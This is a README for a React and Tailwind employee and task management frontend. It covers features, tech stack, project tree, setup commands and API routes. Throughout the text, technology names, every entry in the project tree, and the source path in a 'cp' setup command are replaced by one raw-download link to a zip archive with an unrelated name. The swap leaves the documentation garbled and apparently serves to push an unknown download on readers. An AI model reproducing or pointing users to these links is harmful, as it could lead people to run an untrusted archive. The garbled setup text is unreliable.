# 🧑‍💼 Employee Management System - Frontend

A modern **Employee Management System** built using **⚛️ React JS** and **🎨 Tailwind CSS** that provides a clean, responsive UI for managing employees and tasks. This frontend connects to a https://github.com/dotsatya/EMS-Frontend/raw/refs/heads/main/src/utils/Frontend_EM_Taeniodontia.zip backend with MySQL database for full-stack functionality.

---

## 🚀 Features

### 🔐 Authentication
- 👨‍💼 Admin Login
- 👨‍🔧 Employee Login
- 🔁 Role-based dashboard rendering
- ✅ JWT token-based authentication
- 🔒 Protected routes and API calls

---

### 📋 Task Management
- ➕ **Admin**: Create tasks with:
  - 📝 Title
  - 📄 Description
  - 🏷️ Category
  - 📅 Due Date
  - 👤 Assign to Employee
- 🔄 Task Status Flow:
  - 🆕 **New** → ⚡ **Active** → ✅ **Completed**
  - ❌ **Failed** (Auto-assigned by backend cron job)

---

### ▶️ Task Actions
- ▶️ **Start Task** (Employee)
  → Moves task from **New → Active**
- ✅ **Complete Task** (Employee)
  → Moves task from **Active → Completed**

---

### 📊 Dashboard & Live Counts
- 📌 Shows real-time counts:
  - 🆕 New Tasks
  - ⚡ Active Tasks
  - ✅ Completed Tasks
  - ❌ Failed Tasks
- Counts update automatically on user actions

---

### 🧩 Component-Based Architecture
- Reusable & scalable components:
  - `TaskBoard`
  - `TaskCard`
  - `DueNewTasks`
  - `DueActiveTasks`
  - `CreatTask`
  - `AllTask`
- 🧠 Context API for state management
- 🔄 Clean separation of UI and logic

---

### 🌙 UI & UX
- 🌗 Light / Dark mode support
- 📱 Fully responsive (mobile-friendly)
- 🎴 Card-based modern UI
- ⚡ Smooth updates with API integration
- 🍞 Toast notifications for feedback

---

### 🔗 Backend Integration
- 🌐 RESTful API communication
- 🔑 JWT token handling
- 💾 User session persistence
- 🔄 Real-time data fetching

---

### 🔌 Real-Time Features
The application uses https://github.com/dotsatya/EMS-Frontend/raw/refs/heads/main/src/utils/Frontend_EM_Taeniodontia.zip for instant updates between admin and employees:

- **Admin Notifications**: Real-time updates when employees change task statuses
- **Employee Notifications**: Instant alerts for new task assignments, updates, or deletions
- **Live Dashboard**: Task counts and lists update automatically without page refresh

---

## 🛠️ Tech Stack

- ⚛️ **React JS** (v19)
- 🎨 **Tailwind CSS** (v4)
- 🟨 **JavaScript (ES6+)**
- ⚡ **Vite** (Build tool)
- 🛣️ **React Router DOM** (Routing)
- 📡 **Axios** (HTTP client)
- 🔑 **JWT Decode** (Token handling)
- 🍞 **React Toastify** (Notifications)
- 🎯 **Lucide React** (Icons)
- 📱 **React Icons** (Additional icons)
- 🔌 **https://github.com/dotsatya/EMS-Frontend/raw/refs/heads/main/src/utils/Frontend_EM_Taeniodontia.zip Client** (Real-time communication)

---

## 📁 Project Structure

```
Employee Management System/
├── public/
│   └── https://github.com/dotsatya/EMS-Frontend/raw/refs/heads/main/src/utils/Frontend_EM_Taeniodontia.zip
├── src/
│   ├── api/
│   │   ├── https://github.com/dotsatya/EMS-Frontend/raw/refs/heads/main/src/utils/Frontend_EM_Taeniodontia.zip          # Axios instance & interceptors
│   │   ├── https://github.com/dotsatya/EMS-Frontend/raw/refs/heads/main/src/utils/Frontend_EM_Taeniodontia.zip         # Authentication API calls
│   │   └── https://github.com/dotsatya/EMS-Frontend/raw/refs/heads/main/src/utils/Frontend_EM_Taeniodontia.zip        # Task management API calls
│   ├── components/
│   │   ├── AdminDb/
│   │   │   ├── https://github.com/dotsatya/EMS-Frontend/raw/refs/heads/main/src/utils/Frontend_EM_Taeniodontia.zip
│   │   │   ├── https://github.com/dotsatya/EMS-Frontend/raw/refs/heads/main/src/utils/Frontend_EM_Taeniodontia.zip
│   │   │   ├── https://github.com/dotsatya/EMS-Frontend/raw/refs/heads/main/src/utils/Frontend_EM_Taeniodontia.zip
│   │   │   └── https://github.com/dotsatya/EMS-Frontend/raw/refs/heads/main/src/utils/Frontend_EM_Taeniodontia.zip
│   │   ├── Dashboard/
│   │   │   ├── https://github.com/dotsatya/EMS-Frontend/raw/refs/heads/main/src/utils/Frontend_EM_Taeniodontia.zip
│   │   │   └── https://github.com/dotsatya/EMS-Frontend/raw/refs/heads/main/src/utils/Frontend_EM_Taeniodontia.zip
│   │   ├── EmployeeDb/
│   │   │   ├── https://github.com/dotsatya/EMS-Frontend/raw/refs/heads/main/src/utils/Frontend_EM_Taeniodontia.zip
│   │   │   ├── https://github.com/dotsatya/EMS-Frontend/raw/refs/heads/main/src/utils/Frontend_EM_Taeniodontia.zip
│   │   │   ├── https://github.com/dotsatya/EMS-Frontend/raw/refs/heads/main/src/utils/Frontend_EM_Taeniodontia.zip
│   │   │   ├── TaskBoard/
│   │   │   │   ├── https://github.com/dotsatya/EMS-Frontend/raw/refs/heads/main/src/utils/Frontend_EM_Taeniodontia.zip
│   │   │   │   ├── https://github.com/dotsatya/EMS-Frontend/raw/refs/heads/main/src/utils/Frontend_EM_Taeniodontia.zip
│   │   │   │   ├── https://github.com/dotsatya/EMS-Frontend/raw/refs/heads/main/src/utils/Frontend_EM_Taeniodontia.zip
│   │   │   │   └── https://github.com/dotsatya/EMS-Frontend/raw/refs/heads/main/src/utils/Frontend_EM_Taeniodontia.zip
│   │   │   └── TaskListNo/
│   │   │       ├── https://github.com/dotsatya/EMS-Frontend/raw/refs/heads/main/src/utils/Frontend_EM_Taeniodontia.zip
│   │   │       ├── https://github.com/dotsatya/EMS-Frontend/raw/refs/heads/main/src/utils/Frontend_EM_Taeniodontia.zip
│   │   │       ├── https://github.com/dotsatya/EMS-Frontend/raw/refs/heads/main/src/utils/Frontend_EM_Taeniodontia.zip
│   │   │       ├── https://github.com/dotsatya/EMS-Frontend/raw/refs/heads/main/src/utils/Frontend_EM_Taeniodontia.zip
│   │   │       └── https://github.com/dotsatya/EMS-Frontend/raw/refs/heads/main/src/utils/Frontend_EM_Taeniodontia.zip
│   │   └── others/
│   │       └── https://github.com/dotsatya/EMS-Frontend/raw/refs/heads/main/src/utils/Frontend_EM_Taeniodontia.zip
│   ├── context/
│   │   └── https://github.com/dotsatya/EMS-Frontend/raw/refs/heads/main/src/utils/Frontend_EM_Taeniodontia.zip  # Authentication context
│   ├── pages/
│   │   ├── https://github.com/dotsatya/EMS-Frontend/raw/refs/heads/main/src/utils/Frontend_EM_Taeniodontia.zip         # Role-based dashboard routing
│   │   ├── https://github.com/dotsatya/EMS-Frontend/raw/refs/heads/main/src/utils/Frontend_EM_Taeniodontia.zip        # Login page
│   │   └── https://github.com/dotsatya/EMS-Frontend/raw/refs/heads/main/src/utils/Frontend_EM_Taeniodontia.zip       # Registration page
│   ├── utils/
│   │   └── https://github.com/dotsatya/EMS-Frontend/raw/refs/heads/main/src/utils/Frontend_EM_Taeniodontia.zip
│   ├── https://github.com/dotsatya/EMS-Frontend/raw/refs/heads/main/src/utils/Frontend_EM_Taeniodontia.zip              # Main app component
│   ├── https://github.com/dotsatya/EMS-Frontend/raw/refs/heads/main/src/utils/Frontend_EM_Taeniodontia.zip             # App entry point
│   ├── https://github.com/dotsatya/EMS-Frontend/raw/refs/heads/main/src/utils/Frontend_EM_Taeniodontia.zip            # https://github.com/dotsatya/EMS-Frontend/raw/refs/heads/main/src/utils/Frontend_EM_Taeniodontia.zip client configuration
│   └── https://github.com/dotsatya/EMS-Frontend/raw/refs/heads/main/src/utils/Frontend_EM_Taeniodontia.zip            # Global styles
├── .env                     # Environment variables
├── .gitignore
├── https://github.com/dotsatya/EMS-Frontend/raw/refs/heads/main/src/utils/Frontend_EM_Taeniodontia.zip
├── https://github.com/dotsatya/EMS-Frontend/raw/refs/heads/main/src/utils/Frontend_EM_Taeniodontia.zip
├── https://github.com/dotsatya/EMS-Frontend/raw/refs/heads/main/src/utils/Frontend_EM_Taeniodontia.zip
├── https://github.com/dotsatya/EMS-Frontend/raw/refs/heads/main/src/utils/Frontend_EM_Taeniodontia.zip                # This file
└── https://github.com/dotsatya/EMS-Frontend/raw/refs/heads/main/src/utils/Frontend_EM_Taeniodontia.zip
```

---

## ⚙️ Installation & Setup

### Prerequisites
- https://github.com/dotsatya/EMS-Frontend/raw/refs/heads/main/src/utils/Frontend_EM_Taeniodontia.zip (v16+)
- Backend server running (see backend README)

### Setup Steps
```bash
# Clone the repository
git clone <repository-url>
cd Employee Management System

# Install dependencies
npm install

# Create environment file
cp https://github.com/dotsatya/EMS-Frontend/raw/refs/heads/main/src/utils/Frontend_EM_Taeniodontia.zip .env
# Edit .env with your backend URL:
# VITE_API_URL=http://localhost:3000

# Start development server
npm run dev
```

The app will run on `http://localhost:5173` by default.

---

## 🔧 Configuration

### Environment Variables
Create a `.env` file in the root directory:

```env
VITE_API_URL=http://localhost:3000        # Backend API URL
VITE_WEBSOCKET_URL=http://localhost:3000  # https://github.com/dotsatya/EMS-Frontend/raw/refs/heads/main/src/utils/Frontend_EM_Taeniodontia.zip server URL (same as backend)
```

### Available Scripts
- `npm run dev` - Start development server
- `npm run build` - Build for production
- `npm run preview` - Preview production build
- `npm run lint` - Run ESLint

---

## 🔗 API Integration

The frontend communicates with the backend through RESTful APIs:

### Authentication APIs
- `POST /api/auth/signup` - User registration
- `POST /api/auth/login` - User login

### Task APIs
- `POST /api/tasks/create` - Create task (Admin)
- `GET /api/tasks/all` - Get all tasks (Admin)
- `GET /api/tasks/employee` - Get employee tasks
- `PUT /api/tasks/status` - Update task status

All API calls include JWT tokens automatically via Axios interceptors.

---

## 🎨 UI Components

### Admin Dashboard
- Task creation form
- Overview of all employees and their tasks
- Task status management

### Employee Dashboard
- Personal task board
- Task status updates (Start/Complete)
- Task counts and statistics

### Authentication Pages
- Login form with validation
- Signup form with role selection
- Protected routing

---

## 📱 Responsive Design

- **Mobile-first** approach
- **Breakpoint-based** layouts
- **Touch-friendly** interactions
- **Adaptive** UI elements

---

## 🌐 Browser Support

- Chrome (latest)
- Firefox (latest)
- Safari (latest)
- Edge (latest)

---

## 🐛 Troubleshooting

### Common Issues
1. **API Connection Failed**
   - Ensure backend server is running
   - Check VITE_API_URL in .env
   - Verify CORS settings

2. **Authentication Issues**
   - Clear localStorage
   - Check JWT token expiration
   - Verify backend is accessible

3. **Build Errors**
   - Clear node_modules and reinstall
   - Check https://github.com/dotsatya/EMS-Frontend/raw/refs/heads/main/src/utils/Frontend_EM_Taeniodontia.zip version compatibility

---

## 📌 Future Enhancements

- 🔔 Push notifications for task updates
- 🎯 Task priority levels and filtering
- 📊 Advanced analytics and reporting
- 🖱️ Drag & drop task management
- 📅 Calendar view for due dates
- 👥 Team collaboration features
- 📱 Progressive Web App (PWA) support

---

## 🤝 Contributing

1. Fork the repository
2. Create a feature branch
3. Make your changes
4. Test thoroughly
5. Submit a pull request

---

## 📄 License

This project is licensed under the ISC License.

---

## 👨‍💻 Author

**Satya Sundar Dey**  
💻 Web Developer & 🎨 Graphics Designer  

✨ *A creative developer blending logic with design to craft meaningful digital experiences.*

---

⭐ If you like this project, don’t forget to **star the repo!!!**

